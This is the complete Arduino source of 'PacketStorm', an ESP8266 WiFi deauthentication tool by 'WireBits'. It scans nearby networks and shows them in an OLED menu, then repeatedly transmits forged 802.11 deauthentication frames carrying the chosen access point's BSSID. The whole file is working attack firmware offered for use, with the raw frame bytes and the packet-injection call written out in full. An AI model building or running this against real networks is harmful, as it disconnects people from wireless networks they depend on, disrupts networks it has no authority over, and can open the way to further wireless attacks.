/*
 * PacketStorm
 * An ESP8266-based WiFi deauthentication tool with OLED display and button controls.
 * Author - WireBits
 */

#include <Wire.h>
#include <ESP8266WiFi.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define BTN_UP 14
#define BTN_DOWN 12
#define BTN_SELECT 13
#define OLED_RESET -1
#define SCREEN_HEIGHT 64
#define SCREEN_WIDTH 128
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

struct WiFiNetwork {
    String ssid;
    uint8_t bssid[6];
    int channel;
};

int networkCount = 0;
int targetChannel = 1;
uint8_t targetBSSID[6];
bool deauthRunning = false;
WiFiNetwork scannedNetworks[50];

const uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
};

int scrollOffset = 0;
int currentOption = 0;
int selectMenuOption = 0;
int deauthMenuOption = 0;
bool inDeauthMenu = false;
bool inSelectMenu = false;
String selectedNetwork = "";
const char* options[] = {"SCAN", "SELECT"};

void showMainMenu() {
  display.clearDisplay();
  int totalOptions = 2;
  int menuHeight = totalOptions * 10;
  int startY = (SCREEN_HEIGHT - menuHeight) / 2;
  for (int i = 0; i < totalOptions; i++) {
    display.setCursor(5, startY + (i * 10));
    display.print(i == currentOption ? "* " : "  ");
    display.println(options[i]);
  }
}

void showSelectMenu() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  static unsigned long lastScrollTime = 0;
  static int scrollPos = 0;
  unsigned long currentTime = millis();
  int maxVisibleChars = 17;
  int endIndex = min(scrollOffset + 4, networkCount);
  for (int i = scrollOffset; i < endIndex; i++) {
    String wifiName = scannedNetworks[i].ssid;
    display.setCursor(5, 10 + (i - scrollOffset) * 10);
    display.print((i == selectMenuOption) ? "* " : "  ");
    if (i == selectMenuOption && wifiName.length() > maxVisibleChars) { 
      if (currentTime - lastScrollTime > 400) {
        scrollPos = (scrollPos + 1) % (wifiName.length() - maxVisibleChars + 1);
        lastScrollTime = currentTime;
      }
      display.print(wifiName.substring(scrollPos, scrollPos + maxVisibleChars));
    } else {
      display.print(wifiName.substring(0, maxVisibleChars));
      }
  }
  display.setCursor(5, 10 + (endIndex - scrollOffset) * 10);
  display.print(selectMenuOption == networkCount ? "* " : "  ");
  display.println("BACK");
  display.display();
}

void startWiFiScan() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(38, 10);
  display.println("Scanning");
  display.display();
  WiFi.scanDelete();
  int totalSteps = 20;
  for (int i = 0; i <= totalSteps; i++) {
    display.fillRect(14, 30, (i * (100 / totalSteps)), 8, SSD1306_WHITE);
    display.fillRect(50, 45, 30, 10, SSD1306_BLACK);  
    display.setCursor(50, 45);
    display.print((i * 5));  
    display.print("%");
    display.display();
    delay(50);
  }
  networkCount = 0;
  int foundNetworks = WiFi.scanNetworks();
  for (int i = 0; i < foundNetworks && networkCount < 50; i++) {
    String cleanSSID = cleanWiFiName(WiFi.SSID(i));
    if (cleanSSID.length() > 0) {
      scannedNetworks[networkCount].ssid = cleanSSID;
      memcpy(scannedNetworks[networkCount].bssid, WiFi.BSSID(i), 6);
      scannedNetworks[networkCount].channel = WiFi.channel(i);
      networkCount++;
    }
  }
  display.clearDisplay();
  display.setCursor(22, 28);
  display.println("Scan Completed!");
  display.display();
}

String cleanWiFiName(String ssid) {
  String cleanSSID = "";
  for (int i = 0; i < ssid.length(); i++) {
    char c = ssid[i];
    if (isPrintable(c)) {
      cleanSSID += c;
    }
  }
  cleanSSID.trim();
  return cleanSSID;
}

void showDeauthMenu() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  static unsigned long lastScrollTime = 0;
  static int scrollPos = 0;
  unsigned long currentTime = millis();
  int maxVisibleChars = 16;
  String displaySSID;
  if (selectedNetwork.length() > maxVisibleChars) {
    if (currentTime - lastScrollTime > 400) {
      scrollPos = (scrollPos + 1) % (selectedNetwork.length() + 1);
      lastScrollTime = currentTime;
    }
    int start = scrollPos % (selectedNetwork.length() + 1);
    displaySSID = selectedNetwork.substring(start, start + maxVisibleChars);
  } else {
    displaySSID = selectedNetwork;
    }
    int textWidth = displaySSID.length() * 6;
    int xPos = (SCREEN_WIDTH - textWidth) / 2;
    if (xPos < 0) xPos = 0;
    display.setCursor(xPos, 10);
    display.println(displaySSID);
    int startY = 30;
    display.setCursor(5, startY);
    display.print(deauthMenuOption == 0 ? "* " : "  ");
    display.print("DEAUTH");
    if (deauthRunning) display.print(" <");
    display.println();
    display.setCursor(5, startY + 10);
    display.print(deauthMenuOption == 1 ? "* " : "  ");
    display.print("DEAUTHOFF");
    if (!deauthRunning) display.print(" <");
    display.println();
    display.setCursor(5, startY + 20);
    display.print(deauthMenuOption == 2 ? "* " : "  ");
    display.println("BACK");
    display.display();
}

void startDeauth(int index) {
  WiFi.disconnect();
  wifi_promiscuous_enable(1);
  wifi_set_channel(targetChannel);
  deauthRunning = true;
}

void sendDeauth() {
  uint8_t packet[26];
  memcpy(packet, deauthPacket, 26);
  memcpy(&packet[10], targetBSSID, 6);
  memcpy(&packet[16], targetBSSID, 6);
  wifi_send_pkt_freedom(packet, 26, 0);
  delay(100);
}

void stopDeauth() {
  deauthRunning = false;
  wifi_promiscuous_enable(0);
  WiFi.mode(WIFI_STA);
}

void displayMessage(String message, int delayTime) {
  display.clearDisplay();
  display.setCursor(22, 28);
  display.println(message);
  display.display();
  delay(delayTime);
}

void setup() {
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    for (;;);
  }
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(30, 28);
  display.println("PacketStorm");
  display.display();
  delay(5000);
}

void loop() {
  display.clearDisplay();
  if (inSelectMenu) {
    showSelectMenu();
  } else if (inDeauthMenu) {
    showDeauthMenu();
  } else {
    showMainMenu();
  }
  display.display();
  bool upPressed = digitalRead(BTN_UP) == LOW;
  bool downPressed = digitalRead(BTN_DOWN) == LOW;
  bool selectPressed = digitalRead(BTN_SELECT) == LOW;
  if (downPressed || upPressed) {
    int step = downPressed ? 1 : -1;
    if (inSelectMenu) {
      selectMenuOption = constrain(selectMenuOption + step, 0, networkCount);
      scrollOffset = constrain(selectMenuOption - 3, 0, networkCount - 4);
    } else if (inDeauthMenu) {
      deauthMenuOption = (deauthMenuOption + step + 3) % 3;
    } else {
      currentOption = (currentOption + step + 2) % 2;
    }
    delay(200);
  }
  if (selectPressed) {
    if (inSelectMenu) {
      if (selectMenuOption == networkCount) {
        inSelectMenu = false;
      } else {
        selectedNetwork = scannedNetworks[selectMenuOption].ssid;
        memcpy(targetBSSID, scannedNetworks[selectMenuOption].bssid, 6);
        targetChannel = scannedNetworks[selectMenuOption].channel;
        inSelectMenu = false;
        inDeauthMenu = true;
        deauthMenuOption = 0;
      }
    } else if (inDeauthMenu) {
      switch (deauthMenuOption) {
        case 0: startDeauth(selectMenuOption); break;
        case 1: deauthRunning ? stopDeauth() : displayMessage("Deauth First!", 1000); break;
        case 2: inDeauthMenu = false; break;
      }
    } else {
      switch (currentOption) {
        case 0: startWiFiScan(); break;
        case 1: inSelectMenu = true; selectMenuOption = scrollOffset = 0; break;
      }
    }
    delay(500);
  }
  if (deauthRunning) sendDeauth();
}